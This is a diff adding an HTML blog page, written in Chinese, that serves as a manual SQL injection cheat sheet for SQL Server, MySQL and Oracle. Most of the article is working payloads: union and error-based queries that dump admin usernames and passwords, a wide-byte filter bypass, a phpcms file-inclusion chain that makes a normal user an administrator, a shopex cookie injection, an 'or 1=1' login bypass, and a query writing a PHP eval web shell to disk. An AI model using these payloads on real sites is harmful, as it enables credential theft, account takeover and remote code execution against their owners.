@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>MSSQL、MySQL、Oracle 手工注入 | oneplusone&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="SqlServer： 漏洞：前端漏洞(常规方法检测，有错误回显)，传递 get 参数的时候没有过滤，直接连接到 SQL 语句上。 ····    1.判断注入点方法：加 ‘ 报错，或是加 and 1=1 返回正常，加 and 1=2 返回错误，aspx 一般都是 SqlServer。    2.判断数据库版本：加 and 1=@@version。    3.查看数据库其他信息：查看服务器所在主机名">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MSSQL、MySQL、Oracle 手工注入">
+<meta property="og:url" content="http://yoursite.com/2016/04/18/手工注入/index.html">
+<meta property="og:site_name" content="oneplusone's blog">
+<meta property="og:description" content="SqlServer： 漏洞：前端漏洞(常规方法检测，有错误回显)，传递 get 参数的时候没有过滤，直接连接到 SQL 语句上。 ····    1.判断注入点方法：加 ‘ 报错，或是加 and 1=1 返回正常，加 and 1=2 返回错误，aspx 一般都是 SqlServer。    2.判断数据库版本：加 and 1=@@version。    3.查看数据库其他信息：查看服务器所在主机名">
+<meta property="og:updated_time" content="2016-04-18T07:57:18.201Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="MSSQL、MySQL、Oracle 手工注入">
+<meta name="twitter:description" content="SqlServer： 漏洞：前端漏洞(常规方法检测，有错误回显)，传递 get 参数的时候没有过滤，直接连接到 SQL 语句上。 ····    1.判断注入点方法：加 ‘ 报错，或是加 and 1=1 返回正常，加 and 1=2 返回错误，aspx 一般都是 SqlServer。    2.判断数据库版本：加 and 1=@@version。    3.查看数据库其他信息：查看服务器所在主机名">
+  
+    <link rel="alternative" href="/atom.xml" title="oneplusone&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" type="text/css">
+  
+
+</head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">oneplusone&#39;s blog</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">天行健，君子以自强不息</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-手工注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/04/18/手工注入/" class="article-date">
+  <time datetime="2016-04-18T07:46:29.000Z" itemprop="datePublished">2016-04-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      MSSQL、MySQL、Oracle 手工注入
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="SqlServer_uFF1A"><a href="#SqlServer_uFF1A" class="headerlink" title="SqlServer："></a>SqlServer：</h3><p> 漏洞：前端漏洞(常规方法检测，有错误回显)，传递 get 参数的时候没有过滤，直接连接到 SQL 语句上。<br> ····<br>    1.判断注入点方法：加 ‘ 报错，或是加 and 1=1 返回正常，加 and 1=2 返回错误，aspx 一般都是 SqlServer。<br>    2.判断数据库版本：加 and 1=@@version。<br>    3.查看数据库其他信息：查看服务器所在主机名称：and 1=host_name() ，查看当前用户：and 1=current_user 获得当前用户，设为 Current_User，<br>    查看当前数据库：and 1=db_name()，获得数据库名称，设为 DB_NAME。<br>    4.判断数据表名：and 1=(select top 1 name from DB_NAME.Current_User.sysobjects where xtype=CHAR(85) and name not in (select top N name from DB_NAME.Current_User.sysobjects where xtype=CHAR(85)))–，从 0 开始替换 N 返回表名。这个过程会得到一些有用的表，比如 XXX_admin，XXX_users==。<br>    5.对比较敏感的表进行进一步注入获得字段：and 1=(select top 1 Name from syscolumns where id=object_id(0x5700650062005F00410064006D0069006E00) and name not in(select top N Name from syscolumns where id=object_id(0x5700650062005F00410064006D0069006E00)))，从 0 开始替换 N 逐个返回列名。可能会获得一些有用的字段值，比如 username，password 等等。<br>    6.根据字段名称获得相应的字段内容：”and 1=(select top 1 [Column_Name] from XXX_admin)” 获得字段内容。XXX_admin 是获得的有用的表，Column_Name 是字段名称。<br>····</p>
+<h3 id="Mysql_uFF1A"><a href="#Mysql_uFF1A" class="headerlink" title="Mysql："></a>Mysql：</h3><p>1.漏洞：前端漏洞（常规方法检测不到，用 %ce’ 检测有错误回显），GBK 宽字符转译导致的绕过 sql 注入安全检测。<br>    ①.找到存在漏洞的 URL，常规方法看不到回显，将参数改成 %ce’ ，有回显。<br>    ②.直接构造语句爆出后台账号密码：<a href="http://url/xxx.php?act=xxx&amp;xx=%ce’" target="_blank" rel="external">http://url/xxx.php?act=xxx&amp;xx=%ce’</a> and 1=1 union select 1 and (select 1 from(select count(<em>),concat((select concat(0x5b,user_name,0x3a,password,0x5d) FROM ecs_admin_user limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) %23<br>2.漏洞：前端漏洞(无错误回显)，wap/index.php 的 action 参数存在本地文件包含漏洞，包含可执行 sql 命令文件 field_add.inc.php，而在这个文件中如果参数为 action，没有任何限制和过滤就可以包含本地一个 .inc.php 的文件。field_add.inc.php 件可以看到，$dataformat 没有初始化，$sql 也没有初始化，所以可以直接调用 sql 命令。(怎么检测有这个漏洞？)<br>    ①.注册一个普通用户，查看自己的 ID,userid = 2。<br>    ②.构造 <a href="http://URL/phpcms/wap/index.php?action=../../formguide/admin/include/fields/datetime/field_add&amp;sql=" target="_blank" rel="external">http://URL/phpcms/wap/index.php?action=../../formguide/admin/include/fields/datetime/field_add&amp;sql=</a> update phpcms_member SET groupid=1 where<br>    userid=2。更改注册账号的 groupid（组id）为 1 ，也就是将注册的 test 账号的组从普通用户组改为管理员组。<br>    ③.<a href="http://URL/phpcms/wap/index.php?action=../../formguide/admin/include/fields/datetime/field_add&amp;sql=" target="_blank" rel="external">http://URL/phpcms/wap/index.php?action=../../formguide/admin/include/fields/datetime/field_add&amp;sql=</a> update phpcms_member_cache SET groupid=1 where<br>    userid=2。更改注册账号在缓存表中的 groupid，使其不会因为缓存表未更改导致失败。<br>    ④.<a href="http://URL/phpcms/wap/index.php?action=../../formguide/admin/include/fields/datetime/field_add&amp;sql=" target="_blank" rel="external">http://URL/phpcms/wap/index.php?action=../../formguide/admin/include/fields/datetime/field_add&amp;sql=</a> insert INTO phpcms_admin<br>    (userid,username,allowmultilogin,alloweditpassword) values(2,test,1,1)。将 test 用户插入管理员表，并赋予 test 用户管理员具有的相关权限（后台登录和修改密码的权限）。<br>    ⑤.<a href="http://URL/phpcms/wap/index.php?action=../../formguide/admin/include/fields/datetime/field_add&amp;sql=" target="_blank" rel="external">http://URL/phpcms/wap/index.php?action=../../formguide/admin/include/fields/datetime/field_add&amp;sql=</a> insert INTO phpcms_admin_role (userid,roleid)<br>    values(2,1)。将 test 角色信息插入管理员角色表，使 test 角色为管理员的角色。<br>    ⑥.用test用户登录，即是管理员。<br>3.漏洞：前端漏洞（常规方法检测，有错误回显），传递 get 参数的时候没有过滤，直接拼接到 SQL 语句上。<br>    ①.常规方法检测注入点，有错误回显，可能直接返回数据库类型。<br>    ②.判断字段长度：后面加上 order by N，从数字 1 开始替代 N，直到返回错误页面，判断字段长度为错误页面的 N-1，也就是最后一个正常页面返回。<br>    ③.判断字段位置回显：加上 and 1=2 union select 1,2,3,4,5,……,N-1 最后一个数为字段长度，有回显会将相应数字显示出来。<br>    ④.判断数据库信息：加上 and 1=2 union select 1,2,sql_command,4,5,6,7,8,9,10,11,……,N-1 用 sql 指令替换 sql_command。用 version(),database(),user() 替换。<br>    ！！！注意：这里所得到的当前用户必须是 DBA 或是系统管理员，否则是进行不下去的，因为后面要用到系统表。<br>    ⑤.判断 mysql 所有数据库：加上 and 1=2 union select 1,2,group_concat(convert(SCHEMA_NAME using latin1)),4,5,6,7,8,9,10,……,N-1 from<br>    information_schema.SCHEMATA ，查看 mysql 中所有数据库的名称。<br>    ⑥.判断数据库表：加上 and 1=2 union select 1,2,group_concat(convert(table_name using latin1)),4,5,6,7,8,9,10,……,N-1 from information_schema.tables where<br>    table_schema=database()，查看当前数据库拥有的所有表。可以发现存放用户信息的表 XXX_users，XXX_admin。<br>    ⑦.判断数据表的所有列：加上 and 1=2 union select 1,2,group_concat(convert(column_name using latin1)),4,5,6,7,8,9,10,……,N-1 from information_schema.columns<br>    where table_name=0x636D735F7573657273。table_name=XXX_users，表名需要编码为 16 进制。可能会得到有用的列：userid，username，password 等等。<br>    ⑧.获取字段值：加上 and 1=2 union select 1,2,concat_ws(0x2b,userid,username,password),4,5,6,7,8,9,10,……,N-1 from cms.XXX<em>users。得到数据。<br>    ⑨.解密登陆。<br>4.漏洞：前端漏洞(有错误回显)，shopex 的 cookie 攻击漏洞。<br>    ①.判断注入点：注册账号并登陆，使用 firefox 的 cookiemanager 对 cookie 进行操作。查看 cookie，在 S[CUR] 值后面添加 ‘ 进行验证，发现页面没什么变化，再次使用<br>    ” 进行测试。从报错信息中可以获得表前缀为 sdb</em>，及 sql 语句拼接方式、数据库类型等等数据库信息。<br>    ②.判断字段数：使用” LIMIT 1,1 UNION ALL SELECT 11#<br>    ” LIMIT 1,1 UNION ALL SELECT 11，22#<br>    ” LIMIT 1,1 UNION ALL SELECT 11，22，33#<br>    ……<br>    判断当前表中的字段数，并确定页面显示的字段。从页面中可以判断出该表共有 N 个字段，并且页面显示的是第 X 个字段。（设 N=6，X=3）<br>    ③.查询系统管理员用户：在 shopex 中，管理员用户信息保存在 sdb_operators 表中，使用” LIMIT 1,1 UNION ALL SELECT 11,22,(select count(*) from<br>    sdb_operators),44,55,66# 查询管理员人数。<br>    ④.查询管理员用户名和密码：加上 ” LIMIT 1,1 UNION ALL SELECT 11,22,(select username from sdb_operators limit 0,1),44,55,66# 查询用户名。得到用户名 xxxx。<br>    ⑤.使用” LIMIT 1,1 UNION ALL SELECT 11,22,(select userpass from sdb_operators where username=’xxxx’),44,55,66# 查询管理员密码。<br>    ⑥.解密登陆。<br>5.漏洞：DISCUZ 漏洞(有错误回显)：二次注入，在进行添加回复操作的时候，未对原先存在的 message 信息进行特殊字符过滤，且该 message 直接拼接到 sql 语句中，导致特殊<br>    sql 语句的执行。<br>6.漏洞：前端漏洞(无错误回显)：登陆绕过检测，网站有多处都调用并带入 admin_name 进行查询，虽然在 POST 数据时进行了过滤（首次提交返回错误页面的原因）。但因<br>    get_admin_one 函数和 check_admin 函数没有对带入的 admin_name 进行校验或过滤，导致 sql 注入。<br>    对带入的 admin_name 进行校验或过滤，导致 sql 注入。<br>    在后台登陆界面用户名密码随便输，验证码填正确，burp 抓包：修改 POST 提交的数据，修改其中的 admin_name 值为 XXXX%d5′ or 1=1%23 ，<br>    其中 XXXX 为管理员账号，放行，第一次肯定不成功（因为在 post 数据时进行了过滤），刷新一下就能绕过直接进后台。</p>
+<h3 id="Oracle_uFF1A"><a href="#Oracle_uFF1A" class="headerlink" title="Oracle："></a>Oracle：</h3><p>漏洞：前端漏洞(有错误回显)，get 参数未过滤直接拼接到 SQL 语句：<br>    1.常规方法检测注入点，有错误回显，可能直接返回数据库类型。<br>    2.判断数据库类型：在 url 后面添加 /<em>，页面返回错误，说明不是 mysql 数据库，然后使用 ‘and (select count(</em>) from user_tables)&gt;0– 返回正常，判断该数据库为<br>    oracle 数据库，因为只有 oracle 数据库才有 user_tables 表。<br>    3.获取字段数：使用’ order by 1 — ，通过变换数值，当页面报错时，则字段数就是报错之前的数，设当’ order by N– 页面报错，说明共有 N-1 个字段，设 N=5，通过<br>    ‘ union select null,null,null,null from user_tables order by 1 desc– 返回正常页面验证字段确实为 4 个。<br>    4.判断字段类型：通过<br>    ‘ union select ‘null’,null,null,null from user_tables order by 1 desc–<br>    ‘ union select null,’null’,null,null from user_tables order by 1 desc–<br>    ‘ union select null,null,’null’,null from user_tables order by 1 desc–<br>    ……<br>    判断各字段数据类型：那个返回正确说明那个就是字符型，否则可能是整型或其他类型。(设 2.3 是字符型)。<br>    5.判断各字段在页面中的显示位置：’ union select 1,’2′,’3′,4 from user_tables order by 1 desc– 可能得到 2.3.4 在网页中的显示位置。<br>    6.获取数据库表个数：使用 ‘ and (select count(<em>) from user_tables)=N–,N 从 0 开始 ++，返回正常即有 N 个表。<br>    7.猜测数据表名：使用 ‘ and 1=2 union select 1,’2’,table_name,4 from user_tables– 获取数据表名，设获得关键表名 XXX。<br>    8.判断账号数：利用 ‘ and (select count(</em>) from XXX)&gt;0 — 判断共有多少个账号，用数字替代 0，返回非正常页面证明账号个数为填入的数字。<br>    9.判断字段个数：使用 ‘ and (SELECT count(<em>) FROM USER_TAB_COLUMNS WHERE table_name=’XXX’)&gt;0–，通过替换数字 0，当页面出现错时，此时的数字就是该表的字段个数。<br>    设得到字段个数为 A=2。<br>    10.获取字段名：使用 ‘ and 1=2 union select 1,’2′,COLUMN_NAME,4 from (select </em> from (SELECT COLUMN_NAME FROM USER_TAB_COLUMNS WHERE table_name=’XXX’ order by 1 asc ) WHERE ROWNUM&lt;=A ORDER BY 1 DESC) WHERE ROWNUM&lt;=1，通过不断变换第一个 rownum 后面的数字（A–），可以得到该表的字段名称。设为 name,password.<br>    11.获取管理员信息：利用’ and 1=2 union select 1,name,password,4 from XXX — 获取管理员用户名和密码信息<br>    注入点导出一句话：<br>    在获取到字段数之后，直接联合查询 <a href="http://www.xxx.com/news.php?NewsID=-1" target="_blank" rel="external">http://www.xxx.com/news.php?NewsID=-1</a> union select ‘&lt;?php eval($_POST[cmd]);?&gt;’,2 into outfile ‘D:/wwwroot/eval.php’<br>    然后访问 eval.php。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/04/18/手工注入/" data-id="cin5pv33l0003hcfwzjiytr8y" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2016/04/18/yewuluoji/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">渗透项目常见漏洞</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  
+    
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">December 2015</a><span class="archive-list-count">4</span></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recents</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2016/04/18/手工注入/">MSSQL、MySQL、Oracle 手工注入</a>
+          </li>
+        
+          <li>
+            <a href="/2016/04/18/yewuluoji/">渗透项目常见漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2016/04/18/tiquan/">系统提权</a>
+          </li>
+        
+          <li>
+            <a href="/2016/03/20/移动应用渗透测试备忘单(二)/">移动应用渗透测试备忘单(二)</a>
+          </li>
+        
+          <li>
+            <a href="/2016/03/02/移动应用渗透测试备忘单(一)/">移动应用渗透测试备忘单(一)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2016 oneplusone<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" type="text/css">
+  <script src="/fancybox/jquery.fancybox.pack.js" type="text/javascript"></script>
+
+
+<script src="/js/script.js" type="text/javascript"></script>
+
+  </div>
+</body>
+</html>
